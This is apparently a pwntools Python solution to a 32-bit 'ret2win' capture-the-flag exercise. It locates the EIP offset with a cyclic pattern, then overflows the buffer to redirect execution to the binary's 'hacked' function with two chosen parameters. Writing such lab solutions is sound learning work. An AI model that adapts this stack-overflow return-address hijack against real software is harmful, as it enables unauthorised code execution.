from pwn import *

def find_eip(payload):
    p = process(exe)
    p.recvline()
    p.sendline(payload)
    p.wait()                    # wait process to crash
    eip_offset = cyclic_find(p.corefile.eip)
    info('located EIP offset at {a}'.format(a=eip_offset))

exe = './ret2win_params'
elf = context.binary = ELF(exe) # will exec checksec
context.log_level = 'debug'     # a lot of debug info

#offset = find_eip(cyclic(100))
offset = 28

p = process(exe)                # start program
p.recvline()

payload = b'A'*offset
payload += p32(elf.sym.hacked)  # address of hacked function
payload += p32(0x0)             # Return pointer
payload += p32(0xdeadbeef)      # param 1
payload += p32(0xc0debabe)      # param 2

write('payload', payload)
p.sendline(payload)
p.recvline()
p.recvline()
p.close()

